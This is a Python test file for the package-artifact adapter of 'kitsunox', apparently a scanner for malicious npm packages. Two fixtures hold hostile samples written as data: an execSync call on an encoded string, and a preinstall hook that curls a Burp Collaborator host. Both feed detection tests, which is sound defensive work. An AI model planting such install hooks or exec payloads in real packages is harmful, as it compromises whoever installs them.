"""corpus.py — the package-artifact adapter.

Builds small package trees on disk rather than mocking the filesystem, so the tests
exercise the same rglob/decode path the real corpus will take.
"""

from __future__ import annotations

import io
import json
import tarfile

import pytest

from kitsunox import corpus, rules


@pytest.fixture
def pkg_root(tmp_path):
    """A corpus-shaped tree: <root>/<name>/<version>/package/..."""

    def _make(name: str, version: str, files: dict[str, str | bytes], wrapper: bool = True):
        base = tmp_path / name / version
        base = base / "package" if wrapper else base
        base.mkdir(parents=True, exist_ok=True)
        for rel, content in files.items():
            path = base / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(content, bytes):
                path.write_bytes(content)
            else:
                path.write_text(content, encoding="utf-8")
        return tmp_path

    return _make


# ============================================================== patch synthesis


def test_whole_file_becomes_an_all_added_hunk():
    patch = corpus._as_patch("alpha\nbeta")
    assert patch.splitlines() == ["@@ -0,0 +1,2 @@", "+alpha", "+beta"]


def test_synthesised_patch_is_readable_by_the_real_diff_parser():
    # The whole point of reusing diff shape is that rules.py needs no package-mode branch.
    from kitsunox.model import FileDiff

    diff = FileDiff(path="a.js", change_type="added", is_binary=False, patch=corpus._as_patch("x\ny"))
    assert [t for _, t in rules._added_lines(diff)] == ["x", "y"]


# ============================================================== discovery


def test_discover_finds_name_version_pairs_and_descends_into_package(pkg_root):
    root = pkg_root("evil", "1.0.0", {"index.js": "x"})
    entries = corpus.discover(root, "malicious")
    assert [e.key for e in entries] == ["evil@1.0.0"]
    assert entries[0].root.name == "package"
    assert entries[0].ground_truth == "malicious"


def test_discover_handles_packages_without_the_wrapper_dir(pkg_root):
    root = pkg_root("plain", "2.0.0", {"index.js": "x"}, wrapper=False)
    entry = corpus.discover(root, "benign")[0]
    assert entry.root.name == "2.0.0"
    assert (entry.root / "index.js").is_file()


def test_discover_labels_every_entry_with_the_given_ground_truth(pkg_root):
    root = pkg_root("a", "1.0.0", {"i.js": "x"})
    pkg_root("b", "2.0.0", {"i.js": "x"})
    assert {e.ground_truth for e in corpus.discover(root, "benign")} == {"benign"}


# ============================================================== change construction


def test_paths_are_relative_and_posix_style(pkg_root):
    root = pkg_root("evil", "1.0.0", {"src/deep/mod.js": "x", "index.js": "y"})
    change = corpus.to_change(corpus.discover(root, "malicious")[0])
    assert sorted(f.path for f in change.files) == ["index.js", "src/deep/mod.js"]


def test_non_text_files_are_recorded_as_binary_additions(pkg_root):
    root = pkg_root("evil", "1.0.0", {"logo.png": b"\x89PNG\x00\x01"})
    change = corpus.to_change(corpus.discover(root, "malicious")[0])
    blob = next(f for f in change.files if f.path == "logo.png")
    assert blob.is_binary and blob.change_type == "added" and blob.patch == ""


def test_review_metadata_is_left_absent_not_invented(pkg_root):
    # A package has no reviewer, no CI and no author history. Defaulting any of those to
    # a clean value would let a package score better than a commit for lacking evidence.
    root = pkg_root("evil", "1.0.0", {"index.js": "x"})
    change = corpus.to_change(corpus.discover(root, "malicious")[0])
    assert change.author is None
    assert change.checks_passed is None
    assert change.author_tenure_days is None
    assert change.merged_by is None
    assert change.approving_review_count == 0
    assert change.shas == []


def test_context_rules_stay_inert_on_package_data(pkg_root):
    # Documented limitation: only the content half of Tier 0 is exercised here.
    root = pkg_root("evil", "1.0.0", {"index.js": "const x = 1;"})
    findings = rules.scan(corpus.to_change(corpus.discover(root, "malicious")[0]))
    assert not [f for f in findings if f.rule_id.startswith("context.")]


def test_oversized_files_are_truncated_and_flagged(pkg_root, monkeypatch):
    monkeypatch.setattr(corpus, "MAX_FILE_BYTES", 50)
    root = pkg_root("big", "1.0.0", {"bundle.js": "x" * 500})
    change = corpus.to_change(corpus.discover(root, "malicious")[0])
    diff = next(f for f in change.files if f.path == "bundle.js")
    assert diff.truncated, "a partial scan must not be mistaken for a clean one"
    assert len(diff.patch) < 200


def test_undecodable_bytes_do_not_abort_the_scan(pkg_root):
    root = pkg_root("evil", "1.0.0", {"index.js": b"\xff\xfe invalid utf8 \x00"})
    change = corpus.to_change(corpus.discover(root, "malicious")[0])
    assert len(change.files) == 1  # replaced, not skipped


def test_a_malicious_package_is_detected_through_the_adapter(pkg_root):
    root = pkg_root(
        "evil", "1.0.0",
        {"index.js": 'const b = "' + "A" * 220 + '";\nrequire("child_process").execSync(b);'},
    )
    findings = rules.scan(corpus.to_change(corpus.discover(root, "malicious")[0]))
    assert rules.should_escalate(findings)
    assert "combo.encoded_payload_executed" in {f.rule_id for f in findings}


def test_an_ordinary_package_does_not_escalate(pkg_root):
    root = pkg_root(
        "nice", "1.0.0",
        {
            "index.js": "module.exports = function add(a, b) { return a + b; };",
            "package.json": json.dumps({"name": "nice", "version": "1.0.0"}),
            "README.md": "# nice\n\nAdds numbers.",
        },
    )
    assert not rules.should_escalate(rules.scan(corpus.to_change(corpus.discover(root, "benign")[0])))


# ============================================================== expert labels


def test_load_labels_strips_the_authors_absolute_paths(tmp_path):
    meta = tmp_path / "thinh2001-api" / "1.7.4"
    meta.mkdir(parents=True)
    (meta / "thinh2001-api-1.7.4-analysis.json").write_text(
        json.dumps(
            {
                "package_name": "thinh2001-api",
                "version": "1.7.4",
                "malicious_files": [
                    "/home2/mynames/Documents/NPMAnalysis/Dataset/unzip_malware/"
                    "thinh2001-api/1.7.4/package/src/listen.js",
                    "/some/other/layout/without/the/marker.js",
                ],
            }
        ),
        encoding="utf-8",
    )
    labels = corpus.load_labels(tmp_path)
    assert labels["thinh2001-api@1.7.4"] == ("src/listen.js",)


def test_load_labels_skips_unreadable_or_incomplete_records(tmp_path):
    d = tmp_path / "x" / "1.0.0"
    d.mkdir(parents=True)
    (d / "broken-analysis.json").write_text("{not json", encoding="utf-8")
    (d / "nameless-analysis.json").write_text(json.dumps({"version": "1.0.0"}), encoding="utf-8")
    assert corpus.load_labels(tmp_path) == {}


def test_discover_attaches_matching_labels(pkg_root):
    root = pkg_root("evil", "1.0.0", {"src/listen.js": "x"})
    entry = corpus.discover(root, "malicious", {"evil@1.0.0": ("src/listen.js",)})[0]
    assert entry.malicious_files == ("src/listen.js",)


# ============================================================== tarball reading


def _tgz(files: dict[str, bytes | str], prefix: str = "package/") -> io.BytesIO:
    """Build an npm-shaped .tgz in memory."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for rel, content in files.items():
            data = content.encode() if isinstance(content, str) else content
            info = tarfile.TarInfo(prefix + rel)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    buf.seek(0)
    return buf


def test_from_tarball_strips_the_npm_package_prefix():
    change = corpus.from_tarball("evil", "1.0.0", _tgz({"src/a.js": "x"}), "malicious")
    assert [f.path for f in change.files] == ["src/a.js"]
    assert change.repo == "evil@1.0.0" and change.ground_truth == "malicious"


def test_from_tarball_handles_archives_without_the_prefix():
    change = corpus.from_tarball("plain", "1.0.0", _tgz({"a.js": "x"}, prefix=""), "benign")
    assert [f.path for f in change.files] == ["a.js"]


def test_from_tarball_marks_non_text_members_binary():
    change = corpus.from_tarball("evil", "1.0.0", _tgz({"logo.png": b"\x89PNG"}), "malicious")
    assert change.files[0].is_binary and change.files[0].patch == ""


def test_from_tarball_truncates_oversized_members(monkeypatch):
    monkeypatch.setattr(corpus, "MAX_FILE_BYTES", 40)
    change = corpus.from_tarball("big", "1.0.0", _tgz({"b.js": "y" * 400}), "benign")
    assert change.files[0].truncated


def test_from_tarball_survives_undecodable_members():
    change = corpus.from_tarball("evil", "1.0.0", _tgz({"a.js": b"\xff\xfe\x00bad"}), "malicious")
    assert len(change.files) == 1


def test_from_tarball_leaves_commit_metadata_absent():
    change = corpus.from_tarball("evil", "1.0.0", _tgz({"a.js": "x"}), "malicious")
    assert change.author is None and change.author_tenure_days is None and change.shas == []


def test_from_tarball_detects_an_install_hook_beacon():
    # The dominant npm attack shape, and the one the git corpus could never reveal.
    pkg = json.dumps({"scripts": {"preinstall": "curl https://x.burpcollaborator.net"}})
    change = corpus.from_tarball("evil", "1.0.0", _tgz({"package.json": pkg}), "malicious")
    findings = rules.scan(change)
    assert rules.should_escalate(findings)
    assert "content.install_hook_network" in {f.rule_id for f in findings}


def test_from_tarball_directories_are_skipped():
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        d = tarfile.TarInfo("package/src")
        d.type = tarfile.DIRTYPE
        tar.addfile(d)
        data = b"x"
        f = tarfile.TarInfo("package/src/a.js")
        f.size = len(data)
        tar.addfile(f, io.BytesIO(data))
    buf.seek(0)
    change = corpus.from_tarball("evil", "1.0.0", buf, "malicious")
    assert [f.path for f in change.files] == ["src/a.js"]
